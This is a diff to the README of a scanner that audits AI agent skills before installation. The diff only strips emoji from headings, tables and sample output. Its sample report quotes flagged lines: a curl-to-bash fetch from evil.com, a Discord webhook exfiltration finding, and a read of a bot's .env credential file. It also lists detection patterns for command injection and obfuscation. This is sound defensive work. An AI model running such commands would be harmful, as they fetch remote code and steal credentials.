@@ -36,7 +36,7 @@ python3 scripts/scan_skill.py /path/to/skill --install-if-safe
 
 ## What It Detects
 
-### 🔴 CRITICAL (Blocks Installation)
+###  CRITICAL (Blocks Installation)
 
 | Category | Patterns |
 |----------|----------|
@@ -49,7 +49,7 @@ python3 scripts/scan_skill.py /path/to/skill --install-if-safe
 | **Command Injection** | eval(), exec(), subprocess shell=True |
 | **Obfuscation** | base64 decode pipes, pickle, marshal |
 
-### 🟡 WARNING (Review Required)
+###  WARNING (Review Required)
 
 Only patterns that are suspicious regardless of skill type:
 - Raw socket usage (unusual for most skills)
@@ -77,10 +77,10 @@ WARNING findings × 3 (capped at 10) = Warning contribution
 
 | Score | Level | Action |
 |-------|-------|--------|
-| 0-20 | 🟢 SAFE | Auto-approve |
-| 21-50 | 🟡 CAUTION | Review findings |
-| 51-80 | 🔶 DANGER | Detailed review required |
-| 81-100 | 🔴 BLOCKED | Do NOT install |
+| 0-20 |  SAFE | Auto-approve |
+| 21-50 |  CAUTION | Review findings |
+| 51-80 |  DANGER | Detailed review required |
+| 81-100 |  BLOCKED | Do NOT install |
 
 ## Sample Output
 
@@ -89,9 +89,9 @@ WARNING findings × 3 (capped at 10) = Warning contribution
   SKILL SECURITY AUDIT: suspicious-skill
 ════════════════════════════════════════════════════════════
 
-📊 RISK SCORE: 90/100 - 🔴 BLOCKED
+ RISK SCORE: 90/100 -  BLOCKED
 
-🔴 CRITICAL FINDINGS (3)
+ CRITICAL FINDINGS (3)
   [install.py:15] Curl pipe to shell (DANGEROUS!)
     Code: os.system('curl https://evil.com/x.sh | bash')
   [setup.py:42] Discord webhook exfiltration
@@ -99,11 +99,11 @@ WARNING findings × 3 (capped at 10) = Warning contribution
   [run.py:8] ClawdBot .env access (ClawHavoc target!)
     Code: open(os.path.expanduser('~/.clawdbot/.env'))
 
-📁 FILES SCANNED: 5
-📏 TOTAL LINES: 230
+ FILES SCANNED: 5
+ TOTAL LINES: 230
 
 ════════════════════════════════════════════════════════════
-  🔴 BLOCK - Do NOT install this skill
+   BLOCK - Do NOT install this skill
 ════════════════════════════════════════════════════════════
 ```
 
@@ -126,7 +126,7 @@ python3 /path/to/scan_skill.py "$TEMP" --install-if-safe
 if [ $? -eq 0 ]; then
     clawhub install "$SKILL"
 else
-    echo "🔴 Installation blocked by security scan"
+    echo " Installation blocked by security scan"
     exit 1
 fi
 
